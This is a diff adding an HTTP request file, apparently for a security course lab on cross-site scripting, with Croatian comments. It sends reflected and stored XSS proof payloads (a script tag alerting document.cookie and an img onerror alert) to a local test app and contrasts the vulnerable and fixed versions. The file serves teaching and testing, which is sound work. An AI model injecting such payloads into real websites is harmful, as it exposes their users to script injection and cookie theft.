@@ -1,0 +1,23 @@
+### Lab08 – Cross-Site Scripting (XSS)
+# NAPOMENA: ove odgovore najbolje je otvoriti u PREGLEDNIKU da se vidi izvrsavanje skripte.
+@host = http://localhost:8000
+
+### 1. Reflektirani XSS – otvori URL u pregledniku
+# Ranjivo (main): skripta se izvrsi. Popravljeno: &lt;script&gt; (kodirano) + CSP.
+# q = <script>alert(document.cookie)</script>
+GET {{host}}/lab08/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+
+### 2. Pohranjeni XSS – spremi zlonamjernu recenziju
+POST {{host}}/api/lab08/reviews
+Content-Type: application/json
+
+{"productId": 1, "author": "napadac", "text": "<img src=x onerror=alert('XSS')>"}
+
+### 3. Otvori stranicu recenzija u pregledniku (vidi izvrsava li se payload)
+GET {{host}}/lab08/products/1/reviews
+
+### 4. Legitimna recenzija
+POST {{host}}/api/lab08/reviews
+Content-Type: application/json
+
+{"productId": 1, "author": "Ana", "text": "Odlican proizvod!"}
